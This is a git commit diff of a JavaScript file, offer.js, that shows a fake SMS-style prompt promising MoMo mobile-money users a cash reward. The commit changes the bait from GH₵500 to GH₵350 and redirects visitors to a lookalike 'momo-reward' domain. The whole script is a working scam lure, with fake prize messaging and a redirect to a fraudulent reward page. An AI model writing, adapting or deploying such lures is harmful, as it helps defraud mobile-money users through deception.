bd718902680c5c70c2cf7e67fc0a31b59e3715e6
lagboyme <lagboy33+me@gmail.com>
2025-07-24 03:35:29 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'GH₵500'
-password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive GH₵500 MoMo Republic Day Offer, Kindly Press OK to PROCEED ','GH₵500');
-if (password != 'GH₵500') {
-location.href='https://momo-reward.goprogram.xyz/easter';
+var password = 'GH₵350'
+password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive GH₵350 MoMo Anniversary Reward, Kindly Press OK to PROCEED ','GH₵350');
+if (password != 'GH₵350') {
+location.href='https://momo-reward.goprogram.xyz/gift';
 }
